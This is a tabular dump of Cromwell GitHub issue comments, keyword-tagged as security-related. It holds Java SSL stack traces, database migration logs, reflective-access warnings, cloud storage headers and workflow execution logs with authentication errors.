~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7379,secur,security,7379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"0.4 is the latest release... according to github... (Yes, I realize that there have been tags since, but in the past, I had; been told to avoid these). On Tue, Jan 10, 2017 at 4:24 PM, Thib <notifications@github.com> wrote:. > It's expected that wdltool 0.4 will not validate this as the String; > main_output = hello_and_goodbye.hello_output syntax in workflow outputs; > was introduced specifically for sub workflows which wdltool 0.4 pre-dates.; > Try to update to the latest version of wdltool and it should validate.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk2mhGzhFvb8rAvqTnkXnmX_L-KYAks5rQ_bwgaJpZM4Lf57n>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642:267,validat,validate,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642,2,['validat'],['validate']
Security,"018-06-07 12:16:10,556 INFO - changelog.xml: changesets/workflow_execution_aux_not_null.xml::workflow_execution_aux_not_null::tjeandet: Null constraint has been added to WORKFLOW_EXECUTION_AUX.WORKFLOW_OPTIONS; 2018-06-07 12:16:10,556 INFO - changelog.xml: changesets/workflow_execution_aux_not_null.xml::workflow_execution_aux_not_null::tjeandet: ChangeSet changesets/workflow_execution_aux_not_null.xml::workflow_execution_aux_not_null::tjeandet ran successfully in 2ms; 2018-06-07 12:16:10,561 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Columns ALLOWS_RESULT_REUSE(BOOLEAN),DOCKER_IMAGE_HASH(VARCHAR(100)),RESULTS_CLONED_FROM(INT),EXECUTION_HASH(VARCHAR(100)) added to EXECUTION; 2018-06-07 12:16:10,562 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Index HASH_INDEX created; 2018-06-07 12:16:10,563 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Columns HASH(VARCHAR(100)) added to SYMBOL; 2018-06-07 12:16:10,564 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Foreign key constraint added to EXECUTION (RESULTS_CLONED_FROM); 2018-06-07 12:16:10,564 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: ChangeSet changesets/call_result_caching.xml::call_result_caching::chrisl ran successfully in 5ms; 2018-06-07 12:16:10,569 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Table EXECUTION_EVENT created; 2018-06-07 12:16:10,570 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Foreign key constraint added to EXECUTION_EVENT (EXECUTION_ID); 2018-06-07 12:16:10,571 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Unique constraint added to EXECUTION_EVENT(EXECUTION_ID, DESCRIPTION); 2018-06-07 12:16:10,571 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Change",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:15516,HASH,HASH,15516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['HASH'],['HASH']
Security,0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.A,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8445,secur,security,8445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"1. JMUI features! (Bec); 2. Keys and Directories in WDL. Possibly the After keyword as well.(Chris!); 3. Womtool as a service, /describe endpoint (Adam); 4. PAPI v2 Boot Disk Auto-sizing--WDL & CWL (Jeff?); 5. Call Caching Names for Backends (Miguel); 6. Size and File Hash for DRS files (Saloni); 7. Progress on Horizontal Cromwell (Khalid & Miguel?)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4480#issuecomment-445969081:269,Hash,Hash,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4480#issuecomment-445969081,1,['Hash'],['Hash']
Security,"19-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""Mai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2157,access,access,2157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"1: on google, generating a psURL and calling HEAD on it (which you can also do with a GET and only as for the 1st byte). HTTP/2 200 ; x-guploader-uploadid: AEnB2Uo10d8ECr7tR5601R8roi8MIXlzvg1rjyMui9wavFC7KO2Pv2QBk94Qv22mgAz5Ih0nnayc2kXj5XBFgRUqkNTJNtAo7Q; expires: Fri, 29 Jun 2018 15:56:42 GMT; date: Fri, 29 Jun 2018 15:56:42 GMT; cache-control: private, max-age=0; last-modified: Fri, 29 Jun 2018 15:53:49 GMT; etag: ""09f7e02f1290be211da707a266f153b3""; x-goog-generation: 1530287629024005; x-goog-metageneration: 1; x-goog-stored-content-encoding: identity; x-goog-stored-content-length: 6; content-type: text/plain; content-language: en; x-goog-hash: crc32c=sMnOMw==; x-goog-hash: md5=CffgLxKQviEdpweiZvFTsw==; x-goog-storage-class: STANDARD; accept-ranges: bytes; content-length: 6; server: UploadServer; alt-svc: quic="":443""; ma=2592000; v=""43,42,41,39,35""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990:649,hash,hash,649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990,2,['hash'],['hash']
Security,"2-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-SortAndFixSampleBam/XXXXXX-001.aligned.duplicate_marked.sorted.bam --useOriginalQualities -O XXXXXX-001.recal_data.csv -knownSites /cromwell_root/required-files/references/broadBundle/dbsnp_138.b37.vcf -knownSites /cromwell_root/required-files/references/broadBundle/Mills_and_1000G_gold_standard.indels.b37.vcf -knownSites /cromwell_root/required-files/references/broadBundle/1000G_phase1.indels.b37.vcf -L 10:1+; Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell_root/tmp.bdd4ff39; [Global flags]. (...EXECUTION LOGS...). 16:35:03.610 INFO ProgressMeter - 10:135446829 2.3 3269161 1437710.1; 16:35:03.614 INFO ProgressMeter - Traversal complete. Processed 3269161 total reads in 2.3 minutes.; 16:35:03.819 INFO BaseRecalibrator - Calculating quantized quality scores...; 16:35:03.882 INFO BaseRecalibrator - Writing recalibration report...; 16:35:04.992 INFO BaseRecalibrator - ...done!; 16:35:04.996 INFO BaseRecalibrator - Shutting down engine; [October 31, 2018 4:35:05 PM UTC] org.broadinstitute.hellbender.tools.walkers.bqsr.BaseRecalibrator done. Elapsed time: 2.34 minutes.; Runtime.totalMemory()=4054515712; Tool returned:; 3269161; Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]...; ServiceException: 401 Requester pays bucket access requires authentication. ; Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]...; ServiceException: 401 Requester pays bucket access requires authentication. ; Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]...; ServiceException: 401 Requester pays bucket access requires authentication.; ```. The only thing that is not default in bucket is that we have set lifecycle option to delete objects after 5 days. Our workflow takes ~6 hours to end so it should not be a problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435884126:2325,access,access,2325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435884126,6,"['access', 'authenticat']","['access', 'authentication']"
Security,"2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/real",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:1955,access,access,1955,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"2020-08-24 15:28:47,48] [error] 'nioPath' not implemented for SraPath; java.lang.UnsupportedOperationException: 'nioPath' not implemented for SraPath; 	at cromwell.filesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1102,hash,hashCode,1102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hashCode']
Security,2WomCallableMaker.scala:11); 	at wom.transforms.WomCallableMaker$Ops.toWomCallable(WomCallableMaker.scala:8); 	at wom.transforms.WomCallableMaker$Ops.toWomCallable$(WomCallableMaker.scala:8); 	at wom.transforms.WomCallableMaker$ops$$anon$1.toWomCallable(WomCallableMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomCallNodeMaker$.toWomCallNode(WdlDraft2WomCallNodeMaker.scala:129); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomCallNodeMaker$.toWomCallNode(WdlDraft2WomCallNodeMaker.scala:21); 	at wom.transforms.WomCallNodeMaker$Ops.toWomCallNode(WomCallNodeMaker.scala:9); 	at wom.transforms.WomCallNodeMaker$Ops.toWomCallNode$(WomCallNodeMaker.scala:9); 	at wom.transforms.WomCallNodeMaker$ops$$anon$1.toWomCallNode(WomCallNodeMaker.scala:9); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.buildNode$1(WdlDraft2WomGraphMaker.scala:68); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$3(WdlDraft2WomGraphMaker.scala:38); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.foldFunction$1(WdlDraft2WomGraphMaker.scala:37); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$14(WdlDraft2WomGraphMaker.scala:98); 	at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); 	at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); 	at scala.collection.immutable.List.foldLeft(List.scala:86); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:98); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:3208,validat,validation,3208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['validat'],['validation']
Security,"3-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/ 2> gsutil_output.txt; RC_GSUTIL=$?; if [ \""$RC_GSUTIL\"" = \""1\"" ]; then\n grep \""Bucket is requester pays bucket but no user project provided.\"" gsutil_output.txt && echo \""Retrying with user project\""; gsutil -u bioinfo-prod -h \""Content-Type: text/plain; charset=UTF-8\"" cp /cromwell_root/stdout gs://temporary-files/PET508-001/workspace/SingleSampleGenotyping/b67b285a-1f63-4514-b472-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/; fi ; RC=$?; if [ \""$RC\"" = \""0\"" ]; then break; fi; sleep 5; done; return \""$RC\""; }; retry"": Copying file: ///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. ""; }],; message: ""Workflow failed""; }],; message: ""Workflow failed""; }; ],; ```. This step is executed in a scatter way, 17x per analysis (distinct genomic interval for each shard). Bellow follows the cromwell script of the shard that processed chromosome 12 and 13:. ```bash; #!/bin/bash. cd /cromwell_root; tmpDir=$(mkdir -p ""/cromwell_root/tmp.a7701249"" && echo ""/cromwell_root/tmp.a7701249""); chmod 777 ""$tmpDir""; export _JAVA_OPTIONS=-Djava.io.tmpdir=""$tmpDir""; export TMPDIR=""$tmpDir""; export HOME=""$HOME""; (; cd /cromwell_root. ); oute4a6eeab=""${tmpDir}/out.$$"" erre4a6eeab=""${",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865:1750,access,access,1750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"31b3cf0f2da failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl failed with Traceback (most recent call last):; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:24:1: checking field steps; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:30:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#checker; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:31:5: Field run contains undefined reference to file:///tmp/cwl_temp_dir_2148913290991206234/checker/md5sum_checker.cwl; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:25:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#md5sum; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:26:5: Field run contains undefined reference to file",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477:3428,Validat,ValidationException,3428,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477,1,['Validat'],['ValidationException']
Security,"7:19:17,77] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-04-18 17:19:17,78] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:1749,access,access,1749,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at 